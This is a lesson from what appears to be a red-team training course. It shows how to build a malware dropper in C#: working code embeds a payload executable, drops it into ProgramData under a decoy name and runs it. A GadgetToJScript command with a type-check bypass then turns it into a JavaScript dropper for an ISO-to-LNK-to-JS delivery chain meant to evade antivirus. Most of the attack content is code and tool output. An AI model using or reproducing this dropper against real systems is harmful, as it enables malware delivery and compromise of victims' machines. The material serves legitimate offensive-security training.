# Droppers

Many initial access campaigns do not package the payload in the container directly, opting to use a 'dropper' instead.  Simply put, a dropper is a program that delivers another program.  The purpose of using a dropper is to evade anti-virus and to complicate the analysis of the infection chain.  Most droppers achieve this by extracting embedded resources from inside their own image, or downloading them over a protocol such as HTTP(S) or DNS.

This lesson will demonstrate how to create a JavaScript dropper out of a .NET assembly, using [GadgetToJScript](https://github.com/med0x2e/GadgetToJScript).  Start off by creating a new .NET Framework Class Library project in Visual Studio.

<figure><img src="https://lwfiles.mycourse.app/66e95234fe489daea7060790-public/dbd94b0976ecdf2e5bcd96a2a37ae697.png" alt="" width="100%"><figcaption></figcaption></figure>

Make sure you pick the .NET Framework version, rather than .NET Core.

The project will be created with an empty `Class1.cs` file.

```vbnet
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
  
namespace MyDropper
{
    public class Class1
    {
    }
}
```

First, rename `Class.cs` to `Dropper.cs` (not required, but kinda nice).

Then, right-click on the project in the Solution Explorer and go to **Add > Existing Item**.  Select a payload file to embed in the dropper, e.g. `http_x64.exe`, then in its properties, change the **Build Action** to **Embedded Resource**.

<figure><img src="https://lwfiles.mycourse.app/66e95234fe489daea7060790-public/01bd4c12895e8f9bf69436f3c56bb8ef.png" alt="" height="482" width="305"><figcaption></figcaption></figure>

For G2JS to work properly, all the C# code needs to be inside the class constructor, as this is what's executed during deserialization.  We start off by calling [GetManifestResourceStream](https://learn.microsoft.com/en-us/dotnet/api/system.reflection.assembly.getmanifestresourcestream?view=netframework-4.7.2) to read the embedded resource from the assembly.

```csharp
using System.Reflection;
  
namespace MyDropper
{
    public class Dropper
    {
        public Dropper()
        {
            // use reflection to get reference to own assembly
            var assembly = Assembly.GetExecutingAssembly();
  
            // read embedded payload
            using (var rs = assembly.GetManifestResourceStream("MyDropper.http_x64.exe"))
            {
                // do something
            }
        }
    }
}
```

\
The name of the resource must be prefixed with the project's namespace.

Once the payload has been read, it can be dropped somewhere to disk.  Even though it's tempting to do so, executing malicious code from places like a user's home directory or temporary directories is usually a bad idea.  We want to stick to standard locations such as:

* C:\Program Files\\\*
* C:\Program Files (x86)\\\*
* C:\ProgramData\\\*
* C:\Windows\\\*

Of these locations, only ProgramData is writable by standard users.  Let's create a new directory and drop the payload in there.

```csharp
using (var rs = assembly.GetManifestResourceStream("MyDropper.http_x64.exe"))
{
    // get path to ProgramData
    var path = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
    
    // construct new path with our dir name
    var newPath = Path.Combine(path, "MyLegitApp");
    
    // create new directory inside ProgramData
    var newDir = Directory.CreateDirectory(newPath);
  
    // construct path for the executable
    var filePath = Path.Combine(newDir.FullName, "MyApp.exe");
    
    // drop the path to disk
    using (var fs = File.Create(filePath))
    {
        // copy resource stream into file stream
        rs.CopyTo(fs);
  
        // close file
        rs.Close();
    }
}
```

he dropper can also execute the payload after it has been written it to disk.

```
// execute it
Process.Start(filePath);
```

Build the project and it will produce `MyDropper.dll`.  The next step is to serialise it using GadgetToJScript.

```powershell
PS C:\Users\Attacker> C:\Tools\GadgetToJScript\GadgetToJScript\bin\Release\GadgetToJScript.exe -a C:\Users\Attacker\source\repos\MyDropper\bin\Release\MyDropper.dll -w js -b -o C:\Payloads\dropper
[+]: Generating the js payload
[+]: First stage gadget generation done.
[+]: Loading your .NET assembly:C:\Users\Attacker\source\repos\MyDropper\bin\Release\MyDropper.dll
[+]: Second stage gadget generation done.
[*]: Payload generation completed, check: C:\Payloads\dropper.js
```

Where:

* **-w** is the type of script to output.  Valid options are js, vbs, vba and hta.&#x20;
* **-b** bypasses type check controls introduced in .NET Framework 4.8+.
* **-o** is the output path (excluding the file extension).

This will produce a JavaScript dropper that can be executed using `wscript` or by simply double-clicking it (assuming wscript is set to the default file-handler for this file extension).

<figure><img src="https://lwfiles.mycourse.app/66e95234fe489daea7060790-public/62ec9db9039da8c73a79c4443facce0d.png" alt="" width="100%"><figcaption></figcaption></figure>

If we also packed this dropper into a container, we could have a chain that could resemble something like **ISO => LNK => JS => .NET DLL => EXE**.  Using an executable is a slightly mundane example, although this is leveraged by real actors.  You could also use a dropper to drop a payload DLL to exploit a more complicated DLL or COM hijack, or even perform shellcode injection.
